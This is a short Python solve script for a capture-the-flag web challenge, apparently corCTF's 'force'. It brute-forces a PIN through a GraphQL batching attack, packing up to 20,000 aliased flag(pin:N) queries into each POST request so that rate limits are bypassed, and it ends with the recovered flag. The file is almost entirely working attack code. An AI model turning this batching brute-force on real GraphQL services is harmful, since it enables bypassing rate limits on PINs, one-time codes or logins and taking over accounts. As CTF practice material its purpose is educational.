# https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#batching-attacks
import ast

import requests

N = int(1e5)
SECTIONS = 5

domain = "https://web-force-force-a594aee6f1801c8a.be.ax/"

for i in range(SECTIONS):
    print(f"Starting section {i+1} of {SECTIONS}")
    payload = ',\n'.join([f"{hex(i)[1:]}:flag(pin:{i})" for i in range(N*i // SECTIONS, N*(i+1) // SECTIONS)])
    payload = "{\n" + payload + "\n}"
    req = requests.post(domain, json=payload)
    resp = ast.literal_eval(req.text)

    results: dict[str, str] = resp["data"]
    for k, v in results.items():
        if v != "Wrong!":
            print(k, v)

# corctf{S                T                  O               N                   K                 S}